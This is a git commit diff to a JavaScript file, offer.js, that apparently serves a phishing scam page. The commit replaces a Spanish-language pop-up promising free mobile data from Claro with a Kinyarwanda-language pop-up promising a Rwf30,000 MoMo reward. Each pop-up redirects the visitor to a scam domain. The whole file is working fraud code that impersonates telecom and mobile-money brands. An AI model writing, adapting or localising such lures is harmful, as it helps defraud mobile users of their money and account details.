6efa9c89c267bf3c83e23edb14495442febeb7f2
realmankeny <realmankeny@gmail.com>
2025-04-27 00:19:10 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '60GB INTERNET'
-password=prompt('SMS: Felicitaciones, usted es elegible para recibir 60 GB de Internet gratis como recompensa por su tarjeta SIM antigua. Presione OK para ACTIVAR ','60GB INTERNET');
-if (password != '60GB INTERNET') {
-location.href='https://claro.4g-data.pro/60GB';
+var password = 'Rwf30,000'
+password=prompt('SMS: Twishimiye Konti Yawe ya MoMo Yemerewe kwakira Rwf30,000 Isabukuru Yubile ya MoMo, Nyamuneka Kanda OK kugirango UREBE ','Rwf30,000');
+if (password != 'Rwf30,000') {
+location.href='https://momo-reward.allprogram.site/gift';
 }
